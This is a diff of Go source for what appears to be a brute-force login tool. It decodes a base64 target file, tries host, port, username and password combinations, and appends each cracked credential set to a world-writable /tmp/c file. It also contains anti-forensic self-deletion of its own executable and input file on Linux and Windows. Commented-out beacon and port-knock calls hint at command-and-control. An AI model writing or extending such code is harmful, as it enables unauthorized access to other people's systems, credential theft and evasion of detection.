@@ -27,14 +27,21 @@ var DaC []vars.DelaConnection
 
 const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
+var DontDel bool = false
+
 func Bf(conf vars.Config) {
-	file, err := os.OpenFile("c", os.O_CREATE|os.O_APPEND, 0644)
+	file, err := os.OpenFile("/tmp/c", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0777)
 	if err != nil {
 		check.Check("Error Creating File", err)
 	}
-	if conf.Flags.Destr {
-
-		SelfDel()
+	// err = os.Chmod("/tmp/c", 0777)
+	// if err != nil {
+	// 	log.Fatalf("Error setting file permissions: %s", err)
+	// }
+	if DontDel {
+		if conf.Flags.Destr {
+			SelfDel()
+		}
 	}
 	file.Close()
 	if conf.Flags.BrFile == "" || conf.Client.Host == "" || conf.Client.Port == "" || conf.Client.User == "" || conf.Client.Pass == "" {
@@ -59,12 +66,16 @@ func checkSession(msgSess, msgErr chan vars.Connection) {
 			}
 			DaC = append(DaC, c)
 			stringToWrite := fmt.Sprintf("Host: %s Port: %s Username: %s Password: %s\n", c.Conn.Host, c.Conn.Port, c.Conn.Username, c.Conn.Password)
-			f, err := os.OpenFile("c", os.O_APPEND, 0644)
-			fmt.Println(err)
-			f.Write([]byte(stringToWrite))
-			fmt.Println(stringToWrite) // TODO Write to file
-			// SendBeacons(stringToErite, conf)
-			// WriteToResults(c)
+			f, err := os.OpenFile("/tmp/c", os.O_APPEND|os.O_RDWR, 0777)
+			if err != nil {
+				check.Check("Error On Opening a file", err)
+			}
+			fmt.Println(stringToWrite)
+			_, err = f.Write([]byte(stringToWrite))
+			if err != nil {
+				fmt.Println(err)
+			}
+			f.Close()
 
 		case SingleDel := <-msgErr:
 			c := vars.DelaConnection{
@@ -81,8 +92,10 @@ func checkSession(msgSess, msgErr chan vars.Connection) {
 
 func ReadBfFile(bFile string) ([][]string, error) {
 	x := check.OpenAndReadFiles(bFile)
-	os.Remove(bFile)
-	fmt.Println()
+	if DontDel { //TODO REMOVE
+		os.Remove(bFile)
+	}
+
 	decodedBytes, err := base64.StdEncoding.DecodeString(string(x))
 	er := check.Check("Error decoding base64 BF file:", err)
 	if er != nil {
@@ -165,11 +178,15 @@ func SelfDel() {
 	}
 	fmt.Println(os.Args[0])
 	if runtime.GOOS == "linux" {
-		os.Remove(vars.BrFileHomeDir)
+		if DontDel { //TODO REMOVE
+			os.Remove(vars.BrFileHomeDir)
+		}
 		cmd := exec.Command("bash", "-c", "rm "+exePath)
 		cmd.Start()
 	} else if runtime.GOOS == "windows" {
-		os.Remove(vars.BrFileHomeDir)
+		if DontDel { //TODO REMOVE
+			os.Remove(vars.BrFileHomeDir)
+		}
 		cmd := exec.Command("cmd.exe", "/c", "del "+exePath)
 		cmd.Start()
 	}
@@ -199,7 +216,7 @@ func StartBruteForce(allConn *vars.AllConnections, msgSess, msgErr chan vars.Con
 			time.Sleep(100 * time.Millisecond)
 		}
 		wg.Wait()
-		os.ReadFile("c")
+		os.ReadFile("/tmp/c")
 		// fmt.Println("END NEXT 3")
 		// ("END NEXT 3", conf)
 		// knock.SendKnock("")
